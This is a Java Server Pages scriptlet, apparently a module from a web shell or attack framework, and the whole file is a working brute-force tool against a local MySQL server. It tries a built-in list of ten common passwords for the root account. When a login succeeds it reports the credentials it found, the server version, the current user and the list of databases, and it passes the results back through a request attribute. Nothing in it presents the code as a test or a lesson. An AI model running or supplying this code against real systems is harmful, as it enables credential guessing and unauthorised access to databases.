<%
String host = "127.0.0.1";
int port = 3306;
String username = "root";
int delayMs = 1000;

String[] passwords = {
    "",
    "root",
    "password",
    "123456",
    "admin",
    "mysql",
    "toor",
    "qwerty",
    "123456789",
    "letmein"
};


StringBuilder output = new StringBuilder();

try {

    Class.forName("com.mysql.cj.jdbc.Driver");
    
    output.append("[+] Starting MySQL brute-force on ").append(host).append(":").append(port).append("\n");
    output.append("[+] Target user: ").append(username).append("\n");
    output.append("[+] Passwords to try: ").append(passwords.length).append("\n\n");

    boolean success = false;
    int attempted = 0;

    for (String pwd : passwords) {
        attempted++;
        output.append("[").append(attempted).append("] Trying: '").append(pwd.isEmpty() ? "(empty)" : pwd).append("' ... ");

        java.sql.Connection conn = null;
        try {
            String url = "jdbc:mysql://" + host + ":" + port + "/?connectTimeout=3000&socketTimeout=3000";
            conn = java.sql.DriverManager.getConnection(url, username, pwd);
            
            output.append("SUCCESS!\n");
            output.append("\n[+] CREDENTIALS FOUND:\n");
            output.append("    Host: ").append(host).append(":").append(port).append("\n");
            output.append("    User: ").append(username).append("\n");
            output.append("    Pass: ").append(pwd.isEmpty() ? "(empty)" : pwd).append("\n\n");

            //
            java.sql.DatabaseMetaData meta = conn.getMetaData();
            String version = meta.getDatabaseProductVersion();

            //
            java.sql.Statement stmt = conn.createStatement();
            java.sql.ResultSet rs = stmt.executeQuery("SELECT USER()");
            String currentUser = rs.next() ? rs.getString(1) : "unknown";
            rs.close();

            //
            rs = stmt.executeQuery("SHOW DATABASES");
            java.util.List<String> dbs = new java.util.ArrayList<>();
            while (rs.next()) {
                dbs.add(rs.getString(1));
            }
            rs.close();
            stmt.close();

            output.append("[+] MySQL Version: ").append(version).append("\n");
            output.append("[+] Connected as: ").append(currentUser).append("\n");
            output.append("[+] Databases:\n");
            int maxShow = Math.min(dbs.size(), 10);
            for (int i = 0; i < maxShow; i++) {
                output.append("    - ").append(dbs.get(i)).append("\n");
            }
            if (dbs.size() > 10) {
                output.append("    ... (+ ").append(dbs.size() - 10).append(" more)\n");
            }
            output.append("\n");

            conn.close();
            success = true;
            break;

        } catch (java.sql.SQLException e) {
            int errorCode = e.getErrorCode();
            // 1045 = Access denied
            // 0 = Connection failed (timeout, refused, etc.)
            if (errorCode == 0 && attempted == 1) {
                output = new StringBuilder();
                output.append("ERROR: Cannot connect to MySQL (").append(host).append(":").append(port).append(") - service down or filtered\n");
                request.setAttribute("script_output", output.toString());
                return;
            }
            output.append("FAILED (Access denied)\n");
        } finally {
            if (conn != null) {
                try { conn.close(); } catch (Exception ex) {}
            }
        }

        if (!success && attempted < passwords.length) {
            try {
                Thread.sleep(delayMs);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }
    }

    if (!success) {
        output.append("\n[!] No valid password found.\n");
    }

} catch (ClassNotFoundException e) {
    output.append("ERROR: MySQL JDBC driver not available\n");
} catch (Exception e) {
    output.append("ERROR: Brute-force failed - ").append(e.toString()).append("\n");
}

request.setAttribute("script_output", output.toString());
%>
